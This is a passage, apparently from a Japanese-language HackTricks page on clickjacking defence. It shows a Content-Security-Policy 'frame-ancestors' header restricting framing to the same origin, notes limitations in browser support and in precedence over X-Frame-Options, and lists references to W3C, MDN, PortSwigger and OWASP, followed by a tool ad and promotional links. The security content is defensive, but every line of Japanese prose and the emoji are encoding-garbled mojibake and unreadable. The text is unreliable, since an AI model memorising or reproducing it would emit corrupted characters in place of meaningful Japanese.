ä»¥ä¸‹ã®CSPã¯ã€åŒã˜ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒ•ãƒ¬ãƒ¼ãƒ ã®ã¿ã‚’ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆã«ç™»éŒ²ã—ã¾ã™ã€‚

`Content-Security-Policy: frame-ancestors 'self';`

è©³ç´°ã‚„ã‚ˆã‚Šè¤‡é›‘ãªä¾‹ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### åˆ¶é™ <a href="#limitations" id="limitations"></a>

* **ãƒ–ãƒ©ã‚¦ã‚¶ã®ã‚µãƒãƒ¼ãƒˆ:** CSP frame-ancestorsã¯ã€ã¾ã ã™ã¹ã¦ã®ä¸»è¦ãªãƒ–ãƒ©ã‚¦ã‚¶ã§ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚
* **X-Frame-OptionsãŒå„ªå…ˆã•ã‚Œã‚‹:** CSPä»•æ§˜ã®ã€Œé–¢é€£ä»˜ã‘X-Frame-Optionsã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€ã€Œ_frame-ancestorsãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’å«ã‚€ãƒãƒªã‚·ãƒ¼ãŒãƒªã‚½ãƒ¼ã‚¹ã¨ã¨ã‚‚ã«é…ä¿¡ã•ã‚Œã€ãã®é…ç½®ãŒã€Œå¼·åˆ¶ã€ã§ã‚ã‚‹å ´åˆã€X-Frame-Optionsãƒ˜ãƒƒãƒ€ãƒ¼ã¯ç„¡è¦–ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚‹_ã€ã¨è¿°ã¹ã¦ã„ã¾ã™ãŒã€Chrome 40ã¨Firefox 35ã¯frame-ancestorsãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’ç„¡è¦–ã—ã€ä»£ã‚ã‚Šã«X-Frame-Optionsãƒ˜ãƒƒãƒ€ãƒ¼ã«å¾“ã„ã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰ãŠã‚ˆã³è‡ªå‹•åŒ–**ã§ãã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** HackTricksã§**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ã”è¦§ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡º**ã—ã¦ãã ã•ã„ã€‚

</details>
